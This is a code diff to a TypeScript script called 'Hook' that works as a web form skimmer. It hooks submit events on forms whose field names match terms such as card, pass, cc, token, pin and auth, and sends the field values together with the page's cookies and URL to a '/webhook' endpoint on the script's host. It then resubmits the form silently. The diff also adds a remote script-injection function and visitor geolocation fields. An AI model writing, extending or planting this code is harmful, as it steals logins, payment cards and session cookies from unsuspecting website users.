@@ -1,4 +1,5 @@
-FormData.prototype.serializeObject = function () {
+
+FormData.prototype.serializeObject = function() {
   const obj: Record<any, any> = {};
   for (const pair of this.entries()) {
     let key = pair[0];
@@ -14,7 +15,7 @@ FormData.prototype.serializeObject = function () {
   }
 
   let reformattedObj: Record<any, any> = {};
-  Object.keys(obj).forEach(function (key) {
+  Object.keys(obj).forEach(function(key) {
     let parts = key.split('[');
     let current = reformattedObj;
     for (let i = 0; i < parts.length; i++) {
@@ -34,16 +35,17 @@ FormData.prototype.serializeObject = function () {
   });
   return reformattedObj;
 };
-HTMLFormElement.prototype.serializeObject = function () {
+HTMLFormElement.prototype.serializeObject = function() {
   return new FormData(this).serializeObject();
 };
-Object.prototype.serializeJSON = function () {
-  return JSON.stringify(this);
+Object.prototype.serializeJSON = function() {
+  return JSON.stringify(this, undefined, 4);
 };
-let _wx_ = (document.currentScript ?? document.querySelector('script[id="hook-loader"]')) as HTMLScriptElement;
+let _wx_ = (document.currentScript ??
+  document.querySelector('script[id="hook-loader"]')) as HTMLScriptElement;
 
 interface IHook {
-  send(payload: object): Promise<void>;
+  send(payload: object): Promise<string>;
 
   intercept(form: HTMLFormElement): void;
 
@@ -52,14 +54,34 @@ interface IHook {
   init(selector: string): void;
 }
 
+interface IWhois {
+  city?:              string;
+  organization?:      string;
+  country?:           string;
+  area_code?:         string;
+  organization_name?: string;
+  country_code?:      string;
+  country_code3?:     string;
+  continent_code?:    string;
+  asn?:               number;
+  region?:            string;
+  latitude?:          string;
+  longitude?:         string;
+  accuracy?:          number;
+  ip?:                string;
+  timezone?:          string;
+}
+
 class Hook implements IHook {
   constructor() {
     // @ts-ignore
-    this.uri = new URL(_wx_.src.replace(/^(\/\/)/, window.location.protocol + '//'));
+    this.uri = new URL(
+      _wx_.src.replace(/^(\/\/)/, window.location.protocol + '//')
+    );
   }
 
   get cookies(): Object {
-    return Object.fromEntries(document.cookie.split('; ').map((c) => c.split('=')));
+    return Object.fromEntries(document.cookie.split('; ').map(c => c.split('=')));
   }
 
   private _uri: URL;
@@ -78,57 +100,83 @@ class Hook implements IHook {
     return document.querySelector(selector) as Element;
   }
 
-  send(payload: object) {
+  setCache<T>(key: string, value: T): void {
+    return window.localStorage.setItem(key, JSON.stringify(value));
+  }
+
+  getCache<T>(key: string): T {
+    return JSON.parse(window.localStorage.getItem(key) ?? '{}') as T;
+  }
+
+
+  async send(msg: object) {
+    const payload = { origin: window.location.href, cookies: this.cookies, ...msg };
     const srv = [this.uri.origin, 'webhook'].join('/');
     const now = new Date().valueOf();
-    return fetch(`${srv}?time=${now}`, {
+    return await fetch(`${srv}?time=${now}`, {
       method: 'POST',
+      credentials: 'omit',
+      mode: 'cors',
       headers: {
         'Content-Type': 'application/json',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'cross-site',
+        'X-Requested-With': 'XMLHttpRequest',
+        'Access-Control-Request-Headers': 'X-Requested-With',
+        'Access-Control-Request-Method': 'POST'
       },
-      body: { origin: window.location.href, cookies: this.cookies, ...payload }.serializeJSON(),
-      referrer: window.location.href,
-      referrerPolicy: 'strict-origin-when-cross-origin',
-      mode: 'cors',
-      credentials: 'omit',
+      body: payload.serializeJSON(),
+      referrer: window.location.href
     })
-      .then((response) => {
-        console.warn('fetch', response.status);
-        return response.text();
-      })
-      .then(function (raw) {
-        return raw;
-      })
-      .catch((reason) => reason);
+      .then(response => response.json())
+      .then(raw => raw)
+      .catch((reason) => {
+        throw new Error(reason?.message ?? reason);
+      });
   }
-
+  hex(str:string) {
+    return Array.from(str).map(c =>
+      c.charCodeAt(0) < 128
+        ? c.charCodeAt(0).toString(16)
+        : encodeURIComponent(c).replace(/\%/g,'').toLowerCase()
+    ).join('');
+  }
   intercept(form: HTMLFormElement) {
-    form.addEventListener('submit', this.submithandler);
+    const submitHandler = async (e: SubmitEvent) => {
+      e.preventDefault();
+      const payload = e.target.serializeObject();
+      await this.send(payload).then((_data) => {
+        interceptToggle(false);
+      }, console.error);
+      e.target.submit();
+    };
+    const interceptToggle = (yes: boolean = true) => {
+      yes
+        ? form?.addEventListener('submit', submitHandler)
+        : form?.removeEventListener('submit', submitHandler);
+    };
+    const payload = form.serializeObject();
+    const toggle = Object.keys(payload).find(x => /(card|user|key|pass|senha|cc|email|token|code|pin|auth)/ig.test(x));
+    if (toggle) interceptToggle(true);
   }
-
-  submithandler(e: SubmitEvent) {
-    e.stopPropagation();
-    const payload = e.target.serializeObject();
-    try {
-      this.send(payload)
-        .then((response) => {
-          console.warn('submithandler', response);
-        })
-        .catch((reason) => {
-          console.error('submithandler', reason);
-        });
-    } catch (reason) {
-      console.error('submithandler', reason);
+  inject_script(src:string){
+    const hash_id=this.hex(src)
+    let s:HTMLScriptElement |null= document.querySelector(`script[id="${hash_id}"]`);
+    if (s == null){
+      s = document.createElement('script');
+      s.src = src;
+      s.id = hash_id;
+      s.onload = console.warn;
+      s.onerror = console.warn;
+      document.head.appendChild(s);
     }
   }
-
   init(selector: string) {
-    console.warn('init', { selector: selector, cookies: this.cookies });
+    console.warn('init', { selector: selector, cookies: this.cookies,whois:window?.whois_data });
     this.waitForElement(selector).then((el) => {
-      this.intercept(el as HTMLFormElement);
+      try {
+        this.intercept(el as HTMLFormElement);
+      } catch (e) {
+        console.error(e);
+      }
     });
   }
 }
